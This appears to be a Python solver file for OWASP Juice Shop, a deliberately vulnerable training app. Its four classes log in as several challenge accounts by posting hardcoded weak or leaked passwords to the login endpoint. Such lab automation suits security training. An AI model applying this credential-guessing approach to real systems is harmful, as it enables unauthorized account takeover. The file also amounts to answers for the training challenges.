from core.base_solver import BaseSolver
from loguru import logger

class WeakPasswordSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "weakPasswordChallenge"

    def solve(self) -> bool:
        payload = {
            "email": "admin@juice-sh.op",
            "password": "admin123"
        }
        res = self.client.post("/rest/user/login", json=payload)
        return res.status_code == 200

class LoginSupportSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "loginSupportChallenge"

    def solve(self) -> bool:
        # Support team password is standardized in Juice Shop
        payload = {
            "email": "support@juice-sh.op",
            "password": "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P"
        }
        res = self.client.post("/rest/user/login", json=payload)
        return res.status_code == 200

class LoginRapperSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "loginRapperChallenge"

    def solve(self) -> bool:
        payload = {
            "email": "mc.safesearch@juice-sh.op",
            "password": "Mr. N00dles"
        }
        res = self.client.post("/rest/user/login", json=payload)
        return res.status_code == 200

class LoginAmySolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "loginAmyChallenge"

    def solve(self) -> bool:
        payload = {
            "email": "amy@juice-sh.op",
            "password": "K1f....................."
        }
        res = self.client.post("/rest/user/login", json=payload)
        return res.status_code == 200
